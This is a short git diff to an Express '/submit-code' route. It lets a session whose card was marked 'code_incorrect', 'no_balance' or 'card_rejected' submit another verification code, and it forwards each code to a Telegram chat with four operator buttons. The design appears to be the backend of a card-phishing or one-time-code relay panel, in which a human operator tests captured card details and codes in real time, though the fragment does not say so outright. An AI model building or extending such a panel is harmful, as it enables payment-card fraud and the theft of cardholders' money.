@@ -185,23 +185,31 @@ router.post('/submit-code', async (req, res) => {
       return res.status(400).json({ error: 'sessionId and code are required' });
     }
 
-    // Check if session exists and is approved
+    // Check if session exists
     const record = approvalStore.getRecord(sessionId);
     if (!record) {
       return res.status(404).json({ error: 'Session not found or expired' });
     }
 
-    if (record.status !== 'approved') {
-      return res.status(400).json({ error: 'Card not yet approved' });
+    // Allow code submission if status allows retry
+    const allowedStatuses = ['approved', 'code_incorrect', 'no_balance', 'card_rejected'];
+    if (!allowedStatuses.includes(record.status)) {
+      return res.status(400).json({ error: 'Card not yet approved or session in invalid state' });
     }
 
-    // Check if already verifying
+    // Check if already verifying (skip if retrying after rejection)
+    const isRetry = ['code_incorrect', 'no_balance', 'card_rejected'].includes(record.status);
+
     if (record.status === 'verifying') {
       return res.status(409).json({ error: 'Verification already in progress' });
     }
 
     // Set verification code and status to verifying
-    approvalStore.setVerificationCode(sessionId, code);
+    if (isRetry) {
+      approvalStore.resetVerification(sessionId, code);
+    } else {
+      approvalStore.setVerificationCode(sessionId, code);
+    }
 
     // Send Telegram notification with 4 buttons
     telegramService.sendCodeVerificationRequest({
